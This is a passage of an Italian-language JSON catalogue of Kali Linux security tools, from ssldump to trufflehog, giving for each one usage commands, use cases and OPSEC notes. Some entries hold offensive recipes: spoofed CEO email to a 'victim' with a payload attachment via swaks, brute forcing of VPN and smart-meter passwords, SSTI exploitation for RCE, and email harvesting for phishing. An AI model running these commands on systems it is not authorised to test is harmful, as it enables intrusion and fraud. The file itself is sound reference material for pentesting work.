iptables.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ssldump",
    "name": "ssldump",
    "version": "1.9",
    "icon": "../app/icons/ssldump-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssldump/",
    "desc": "Analizza traffico SSL/TLS decodificando handshake e mostrando cipher negoziati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ssldump</strong> è un analizzatore di protocollo SSL/TLS che decodifica traffico cifrato. Mostra dettagli dell'handshake, cipher negoziati, certificati e può decifrare traffico se fornita la chiave privata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Handshake Analysis:</strong> decodifica completa del TLS handshake</p><p><strong>Cipher Display:</strong> mostra suite crittografiche negoziate</p><p><strong>Certificate Extraction:</strong> visualizza certificati scambiati</p><p><strong>Decryption:</strong> decifra traffico con chiave privata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura live su interfaccia\nssldump -i eth0 port 443\n\n# Da file pcap\nssldump -r capture.pcap\n\n# Mostra application data (con chiave)\nssldump -r capture.pcap -k server.key -d\n\n# Output dettagliato\nssldump -i eth0 -A -d port 443\n\n# Solo handshake\nssldump -i eth0 -H port 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>TLS debugging</strong>, analizza problemi di handshake.</p><p>Per <strong>security audit</strong>, verifica cipher negoziati.</p><p>Per <strong>forensics</strong>, ricostruisce sessioni TLS con chiave nota.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Decryption:</strong> richiede chiave privata del server.</p><p><strong>PFS:</strong> con ECDHE/DHE la chiave privata non basta.</p><p><strong>Legal:</strong> intercettazione traffico potrebbe essere illegale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "sslscan",
    "name": "sslscan",
    "version": "2.1.5",
    "icon": "../app/icons/sslscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslscan/",
    "desc": "Testa configurazione SSL/TLS: cipher, protocolli, certificati e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sslscan</strong> è uno scanner per analizzare configurazioni SSL/TLS di server. Enumera cipher supportati, versioni protocollo, dettagli certificato e identifica configurazioni insicure o vulnerabilità note.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cipher Enumeration:</strong> lista tutti i cipher supportati</p><p><strong>Protocol Testing:</strong> verifica SSLv2/v3, TLS 1.0/1.1/1.2/1.3</p><p><strong>Vulnerability Check:</strong> Heartbleed, POODLE, etc.</p><p><strong>Certificate Analysis:</strong> dettagli cert, chain, expiry</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nsslscan target.com\n\n# Con porta specifica\nsslscan target.com:8443\n\n# Output XML\nsslscan --xml=output.xml target.com\n\n# Solo cipher deboli\nsslscan --show-cipher-ids target.com\n\n# STARTTLS per SMTP\nsslscan --starttls-smtp mail.target.com:25</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit</strong>, valuta configurazione TLS.</p><p>Per <strong>compliance</strong>, verifica requisiti PCI-DSS.</p><p>Per <strong>vulnerability assessment</strong>, identifica cipher deboli e protocolli obsoleti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> connessioni TLS loggabili dal server.</p><p><strong>Detection:</strong> enumeration pattern riconoscibile.</p><p><strong>Rate:</strong> molte connessioni in breve tempo sono sospette.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sslyze",
    "name": "sslyze",
    "version": "6.2.0",
    "icon": "../app/icons/sslyze-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslyze/",
    "desc": "Scanner SSL/TLS veloce e completo con output JSON per automazione security audit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SSLyze</strong> è uno scanner SSL/TLS veloce e completo scritto in Python. Offre output JSON strutturato ideale per automazione, supporta scan paralleli e verifica conformità a standard come Mozilla Observatory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Scanning:</strong> scansioni parallele multi-thread</p><p><strong>JSON Output:</strong> output strutturato per automazione</p><p><strong>Compliance Check:</strong> verifica Mozilla, PCI-DSS guidelines</p><p><strong>Certificate Validation:</strong> chain completa, OCSP, CT logs</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nsslyze target.com\n\n# Output JSON\nsslyze --json_out=result.json target.com\n\n# Scan multipli host\nsslyze --targets_in=hosts.txt\n\n# Solo vulnerabilità\nsslyze --heartbleed --robot --openssl_ccs target.com\n\n# Mozilla compliance\nsslyze --mozilla_config=modern target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CI/CD integration</strong>, verifica automatica TLS in pipeline.</p><p>Per <strong>compliance audit</strong>, report JSON per documentazione.</p><p>Per <strong>mass scanning</strong>, analisi rapida di molti endpoint.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scanning:</strong> genera traffico identificabile come security scan.</p><p><strong>Rate:</strong> scan veloci possono triggerare rate limiting.</p><p><strong>Logging:</strong> connessioni loggabili dal target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "subfinder",
    "name": "subfinder",
    "version": "2.6.0",
    "icon": "../app/icons/subfinder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subfinder/",
    "desc": "Enumera subdomain passivamente usando decine di fonti: Shodan, Censys, VirusTotal.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Subfinder</strong> è uno strumento per subdomain enumeration passiva sviluppato da ProjectDiscovery. Interroga decine di fonti (Shodan, Censys, VirusTotal, SecurityTrails) senza contattare direttamente il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Recon:</strong> nessun traffico verso il target</p><p><strong>Multiple Sources:</strong> 50+ fonti di dati integrate</p><p><strong>API Keys:</strong> supporta chiavi per fonti premium</p><p><strong>Output Formats:</strong> JSON, text, stdout per pipeline</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base\nsubfinder -d target.com\n\n# Output su file\nsubfinder -d target.com -o subdomains.txt\n\n# Multipli domini\nsubfinder -dL domains.txt\n\n# Solo fonti specifiche\nsubfinder -d target.com -sources shodan,censys\n\n# JSON output\nsubfinder -d target.com -json -o output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>bug bounty</strong>, scopre asset per testing.</p><p>Per <strong>attack surface mapping</strong>, identifica tutti i subdomain.</p><p>Per <strong>passive recon</strong>, raccoglie info senza alertare il target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> non genera traffico verso il target.</p><p><strong>API Logging:</strong> query loggate dai provider.</p><p><strong>Data Freshness:</strong> risultati potrebbero essere datati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "subjack",
    "name": "subjack",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subjack/",
    "desc": "Rileva subdomain takeover su servizi cloud: S3, Heroku, GitHub Pages, Azure.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Subjack</strong> è uno scanner per subdomain takeover che identifica CNAME pendenti verso servizi cloud non reclamati. Supporta AWS S3, Heroku, GitHub Pages, Azure, Shopify e molti altri provider.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Provider:</strong> supporta 30+ servizi cloud</p><p><strong>CNAME Detection:</strong> identifica record DNS pendenti</p><p><strong>Fingerprinting:</strong> verifica response per confermare takeover</p><p><strong>Fast Scanning:</strong> scansione parallela ad alte prestazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan lista subdomain\nsubjack -w subdomains.txt\n\n# Con threads\nsubjack -w subdomains.txt -t 100\n\n# Output risultati\nsubjack -w subdomains.txt -o results.txt\n\n# Con SSL verification\nsubjack -w subdomains.txt -ssl\n\n# Verbose mode\nsubjack -w subdomains.txt -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>bug bounty</strong>, trova subdomain takeover per reward.</p><p>Per <strong>security audit</strong>, verifica che CNAME siano tutti attivi.</p><p>Per <strong>attack surface</strong>, identifica rischi da servizi dismessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>DNS Queries:</strong> genera traffico DNS identificabile.</p><p><strong>False Positives:</strong> verificare manualmente prima di reporting.</p><p><strong>Legal:</strong> il takeover effettivo richiede autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sublist3r",
    "name": "sublist3r",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sublist3r/",
    "desc": "Enumera subdomain usando motori di ricerca e servizi come Netcraft, DNSdumpster.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sublist3r</strong> è uno strumento Python per subdomain enumeration che utilizza motori di ricerca (Google, Bing, Yahoo) e servizi specializzati (Netcraft, DNSdumpster, VirusTotal) per scoprire subdomain.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Search Engines:</strong> query su Google, Bing, Yahoo, Baidu</p><p><strong>DNS Services:</strong> Netcraft, DNSdumpster, ThreatCrowd</p><p><strong>Brute Force:</strong> opzionale con subbrute integrato</p><p><strong>Port Scanning:</strong> verifica porte su subdomain trovati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base\nsublist3r -d target.com\n\n# Output su file\nsublist3r -d target.com -o subdomains.txt\n\n# Con brute force\nsublist3r -d target.com -b\n\n# Threads per brute force\nsublist3r -d target.com -b -t 50\n\n# Con port scan\nsublist3r -d target.com -p 80,443,8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reconnaissance</strong>, mappa subdomain di un target.</p><p>Per <strong>bug bounty</strong>, scopre asset nel scope.</p><p>Per <strong>penetration testing</strong>, identifica punti di ingresso aggiuntivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Rate Limits:</strong> motori di ricerca possono bloccare.</p><p><strong>Detection:</strong> brute force genera traffico DNS.</p><p><strong>Captchas:</strong> query eccessive triggerano captcha.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "swaks",
    "name": "swaks",
    "version": "20240103.0",
    "icon": "../app/icons/swaks-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/swaks/",
    "desc": "Swiss Army Knife SMTP: test mail server, relay, auth, TLS con massima flessibilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Swaks</strong> (Swiss Army Knife for SMTP) è uno strumento flessibile per testing di server SMTP. Permette di testare relay, autenticazione, TLS, e inviare email personalizzate per verifiche di sicurezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMTP Testing:</strong> test completo di funzionalità server</p><p><strong>Auth Support:</strong> PLAIN, LOGIN, CRAM-MD5, NTLM</p><p><strong>TLS/STARTTLS:</strong> test encryption options</p><p><strong>Custom Headers:</strong> crafting completo email</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test invio base\nswaks --to victim@target.com --from attacker@domain.com --server mail.target.com\n\n# Con autenticazione\nswaks --to user@target.com --server mail.target.com --auth LOGIN --auth-user user --auth-password pass\n\n# STARTTLS\nswaks --to user@target.com --server mail.target.com --tls\n\n# Con attachment\nswaks --to user@target.com --attach payload.pdf --server mail.target.com\n\n# Spoofed header\nswaks --to victim@target.com --from ceo@company.com --header \"Subject: Urgent\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>relay testing</strong>, verifica open relay.</p><p>Per <strong>phishing simulation</strong>, testa invio email spoofate.</p><p>Per <strong>mail server audit</strong>, valuta configurazioni di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tutte le email loggabili.</p><p><strong>SPF/DKIM:</strong> email spoofate possono essere rifiutate/marcate.</p><p><strong>Traceability:</strong> IP mittente visibile negli header.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "tcpreplay",
    "name": "tcpreplay",
    "version": "4.5.1",
    "icon": "../app/icons/tcpreplay-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tcpreplay/",
    "desc": "Riproduce catture pcap su rete per test IDS/IPS e replay di attacchi registrati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>tcpreplay</strong> è una suite per riprodurre traffico di rete da file pcap. Permette di reiniettare catture su interfacce di rete per testare IDS/IPS, firewall e verificare detection di attacchi noti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Traffic Replay:</strong> ritrasmette pcap su interfaccia</p><p><strong>Speed Control:</strong> modifica velocità di replay</p><p><strong>Packet Editing:</strong> tcprewrite per modifiche IP/MAC</p><p><strong>Bidirectional:</strong> replay su due interfacce simultanee</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Replay base\ntcpreplay -i eth0 capture.pcap\n\n# Replay alla velocità originale\ntcpreplay -i eth0 --topspeed capture.pcap\n\n# Modifica velocità (10x)\ntcpreplay -i eth0 --multiplier=10 capture.pcap\n\n# Loop infinito\ntcpreplay -i eth0 --loop=0 capture.pcap\n\n# Modifica IP prima del replay\ntcprewrite --infile=original.pcap --outfile=modified.pcap --srcipmap=10.0.0.0/8:192.168.0.0/16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS testing</strong>, verifica detection di attacchi noti.</p><p>Per <strong>network testing</strong>, stress test con traffico reale.</p><p>Per <strong>SOC training</strong>, genera alert realistici per esercitazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Impact:</strong> può influenzare traffico di produzione.</p><p><strong>Detection:</strong> replay può essere identificato da timestamp.</p><p><strong>Authorization:</strong> usare solo su reti di test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "termineter",
    "name": "termineter",
    "version": "1.0.6",
    "icon": "../app/icons/termineter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/termineter/",
    "desc": "Framework pentesting smart meter via protocolli AMI: C12.18, C12.19, ANSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Termineter</strong> è un framework per security assessment di smart meter e sistemi AMI (Advanced Metering Infrastructure). Supporta protocolli ANSI C12.18/C12.19 per testare contatori elettrici intelligenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Support:</strong> ANSI C12.18, C12.19, DLMS</p><p><strong>Optical Probe:</strong> supporto sonde ottiche per smart meter</p><p><strong>Table Reading:</strong> legge tabelle dati contatori</p><p><strong>Security Testing:</strong> brute force password e bypass authentication</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia termineter\ntermineter\n\n# Connetti via seriale\nconnect --serial /dev/ttyUSB0\n\n# Login al meter\nlogin --password 00000000\n\n# Leggi tabelle\nread_table 0\nread_table 1\n\n# Brute force password\nbrute_force --wordlist passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>utility security</strong>, testa sicurezza contatori.</p><p>Per <strong>ICS assessment</strong>, valuta infrastruttura AMI.</p><p>Per <strong>research</strong>, analizza protocolli smart grid.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legal:</strong> accesso non autorizzato a meter è illegale.</p><p><strong>Physical:</strong> richiede accesso fisico al contatore.</p><p><strong>Damage:</strong> comandi errati possono danneggiare dispositivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "testssl.sh",
    "name": "testssl.sh",
    "version": "3.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/testssl.sh/",
    "desc": "Script bash per test completo TLS/SSL: cipher, vulnerabilità, certificate chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>testssl.sh</strong> è uno script bash completo per testing SSL/TLS che non richiede dipendenze esterne. Verifica cipher, protocolli, certificate chain e vulnerabilità note con output colorato e formattato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>No Dependencies:</strong> usa solo openssl presente nel sistema</p><p><strong>Comprehensive:</strong> test 400+ cipher, tutte le vulnerabilità note</p><p><strong>Output Formats:</strong> HTML, JSON, CSV per automazione</p><p><strong>Rating:</strong> assegna rating sicurezza (A-F)</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test completo\ntestssl.sh https://target.com\n\n# Solo vulnerabilità\ntestssl.sh --vulnerable target.com:443\n\n# Output JSON\ntestssl.sh --jsonfile result.json target.com\n\n# Con rating\ntestssl.sh --severity target.com\n\n# STARTTLS per email\ntestssl.sh --starttls smtp mail.target.com:25</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>compliance audit</strong>, verifica requisiti PCI-DSS/HIPAA.</p><p>Per <strong>security assessment</strong>, identifica configurazioni deboli.</p><p>Per <strong>reporting</strong>, genera documentazione formattata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Connections:</strong> genera molte connessioni TLS.</p><p><strong>Detection:</strong> pattern scan riconoscibile.</p><p><strong>Logging:</strong> test loggabili dal target.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "thc-pptp-bruter",
    "name": "thc-pptp-bruter",
    "version": "0.1.4",
    "icon": "../app/icons/thc-pptp-bruter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/thc-pptp-bruter/",
    "desc": "Brute force su VPN PPTP per testare password deboli su gateway aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>THC-PPTP-Bruter</strong> è uno strumento per brute force di password su VPN PPTP. Testa credenziali contro gateway VPN aziendali identificando account con password deboli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PPTP Protocol:</strong> supporto nativo protocollo PPTP</p><p><strong>MSCHAPv2:</strong> brute force autenticazione MS-CHAPv2</p><p><strong>Wordlist:</strong> attacco dizionario con wordlist custom</p><p><strong>Parallel:</strong> connessioni parallele per velocità</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force singolo utente\nthc-pptp-bruter -u admin -w passwords.txt vpn.target.com\n\n# Con porta custom\nthc-pptp-bruter -u admin -w passwords.txt -p 1723 vpn.target.com\n\n# Verbose mode\nthc-pptp-bruter -v -u admin -w passwords.txt vpn.target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN assessment</strong>, testa robustezza credenziali.</p><p>Per <strong>external pentest</strong>, trova accesso VPN con password deboli.</p><p>Per <strong>compliance</strong>, verifica policy password su VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> tentativi falliti possono bloccare account.</p><p><strong>Logging:</strong> VPN gateway loggano tutti i tentativi.</p><p><strong>Detection:</strong> molti tentativi generano alert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "theharvester",
    "name": "theharvester",
    "version": "4.8.2",
    "icon": "../app/icons/theharvester-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/theharvester/",
    "desc": "Raccoglie email, subdomain, IP da fonti pubbliche: Google, Bing, LinkedIn, Shodan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TheHarvester</strong> è uno strumento OSINT per raccogliere informazioni da fonti pubbliche. Estrae email, nomi, subdomain e IP da motori di ricerca, social network e database pubblici come Shodan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Google, Bing, LinkedIn, Shodan, Hunter.io</p><p><strong>Email Harvesting:</strong> estrae indirizzi email validi</p><p><strong>Subdomain Discovery:</strong> trova subdomain del target</p><p><strong>Virtual Hosts:</strong> identifica vhost su stesso IP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Harvesting da tutte le fonti\ntheHarvester -d target.com -b all\n\n# Solo Google\ntheHarvester -d target.com -b google\n\n# LinkedIn per nomi\ntheHarvester -d target.com -b linkedin\n\n# Con limit risultati\ntheHarvester -d target.com -b all -l 500\n\n# Output file\ntheHarvester -d target.com -b all -f output.html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reconnaissance</strong>, raccoglie info su target.</p><p>Per <strong>phishing prep</strong>, crea lista email per campagne.</p><p>Per <strong>social engineering</strong>, identifica dipendenti e ruoli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> non contatta direttamente il target.</p><p><strong>API Keys:</strong> molte fonti richiedono chiavi API.</p><p><strong>Rate Limits:</strong> motori di ricerca possono bloccare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "tinja",
    "name": "tinja",
    "version": "1.2.0",
    "icon": "../app/icons/tinja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tinja/",
    "desc": "Rileva e exploita Server-Side Template Injection in framework web comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Tinja</strong> è uno scanner e exploitation tool per Server-Side Template Injection (SSTI). Rileva automaticamente template engine vulnerabili e genera payload per RCE su framework come Jinja2, Twig, Freemarker.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Detection:</strong> identifica template engine dal comportamento</p><p><strong>Multi-Engine:</strong> Jinja2, Twig, Freemarker, Velocity, Smarty</p><p><strong>RCE Payloads:</strong> genera payload per command execution</p><p><strong>Polyglot:</strong> payload che funzionano su più engine</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan parametro per SSTI\ntinja -u \"http://target.com/page?name=INJECT\"\n\n# Con metodo POST\ntinja -u \"http://target.com/page\" -d \"name=INJECT\"\n\n# Da request file\ntinja -r request.txt\n\n# Genera payload per engine specifico\ntinja -u \"http://target.com/page?name=INJECT\" --engine jinja2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web pentest</strong>, trova SSTI in applicazioni web.</p><p>Per <strong>RCE</strong>, sfrutta SSTI per command execution.</p><p>Per <strong>bug bounty</strong>, identifica vulnerabilità template injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload SSTI possono essere loggati.</p><p><strong>WAF:</strong> molti WAF bloccano pattern di injection.</p><p><strong>Impact:</strong> RCE riuscito dà controllo completo del server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SSTI"
    ],
    "notes": null
  },
  {
    "id": "tlssled",
    "name": "tlssled",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tlssled/",
    "desc": "Wrapper per sslscan e openssl per audit rapido SSL/TLS con report formattato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TLSSLed</strong> è uno script wrapper che combina sslscan e openssl per audit rapido di configurazioni SSL/TLS. Genera report formattato e colorato con tutte le informazioni rilevanti per security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Combined Tools:</strong> integra sslscan e openssl s_client</p><p><strong>Quick Audit:</strong> test rapido in singolo comando</p><p><strong>Formatted Output:</strong> report colorato e leggibile</p><p><strong>Vulnerability Check:</strong> verifica configurazioni insicure</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Audit SSL/TLS completo\ntlssled target.com 443\n\n# Solo HTTPS\ntlssled www.target.com 443\n\n# SMTP con STARTTLS\ntlssled mail.target.com 25\n\n# Output su file\ntlssled target.com 443 > report.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>quick assessment</strong>, audit veloce configurazione TLS.</p><p>Per <strong>reporting</strong>, genera output formattato per documentazione.</p><p>Per <strong>compliance check</strong>, verifica requisiti minimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dependencies:</strong> richiede sslscan installato.</p><p><strong>Connections:</strong> genera multiple connessioni.</p><p><strong>Detection:</strong> pattern scan identificabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "tnscmd10g",
    "name": "tnscmd10g",
    "version": "1.3",
    "icon": "../app/icons/tnscmd10g-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tnscmd10g/",
    "desc": "Invia comandi TNS a Oracle listener per version detection e service enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>tnscmd10g</strong> è uno strumento per interagire con Oracle TNS listener. Permette di inviare comandi TNS per version detection, service enumeration e ottenere informazioni sulla configurazione del database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Version Detection:</strong> identifica versione Oracle listener</p><p><strong>Service Enumeration:</strong> lista servizi registrati</p><p><strong>Status Query:</strong> ottiene stato listener</p><p><strong>TNS Commands:</strong> invia comandi TNS arbitrari</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Version detection\ntnscmd10g version -h 192.168.1.100\n\n# Status listener\ntnscmd10g status -h 192.168.1.100\n\n# Lista servizi\ntnscmd10g services -h 192.168.1.100\n\n# Porta custom\ntnscmd10g version -h 192.168.1.100 -p 1521</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle enumeration</strong>, raccoglie info su database Oracle.</p><p>Per <strong>pentest</strong>, identifica versioni vulnerabili.</p><p>Per <strong>inventory</strong>, mappa istanze Oracle in rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> query TNS loggabili dal listener.</p><p><strong>Authentication:</strong> alcuni comandi richiedono password.</p><p><strong>Hardening:</strong> listener moderni limitano info esposte.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "trufflehog",
    "name": "trufflehog",
    "version": "3.57.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/trufflehog/",
    "desc": "Trova secrets in repository Git: API keys, password, token nei commit storici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>TruffleHog</strong> è uno strumento per trovare secrets esposti in repository Git. Scansiona tutta la history dei commit cercando API keys, password, token e altre credenziali accidentalmente committate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Git History:</strong> scansiona tutti i commit, non solo HEAD</p><p><strong>Entropy Analysis:</strong> rileva stringhe ad alta entropia</p><p><strong>Regex Patterns:</strong> pattern per AWS, GCP, GitHub, Stripe, etc.</p><p><strong>Verification:</strong> verifica se secrets sono ancora validi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan repository locale\ntrufflehog filesystem /path/to/repo\n\n# Scan GitHub repository\ntrufflehog github --repo https://github.com/org/repo\n\n# Scan organizzazione GitHub\ntrufflehog github --org organization\n\n# Con verifica secrets\ntrufflehog github --repo https://github.com/org/repo --only-verified\n\n# Output JSON\ntrufflehog filesystem /path/to/repo --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit</strong>, trova secrets esposti in codebase.</p><p>Per <strong>bug bounty</strong>, cerca credenziali in repo pubblici.</p><p>Per <strong>DevSecOps</strong>, integra in CI/CD pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Calls:</strong> verification richiede chiamate API.</p><p><strong>Rate Limits:</strong> scan grandi repo può colpire rate 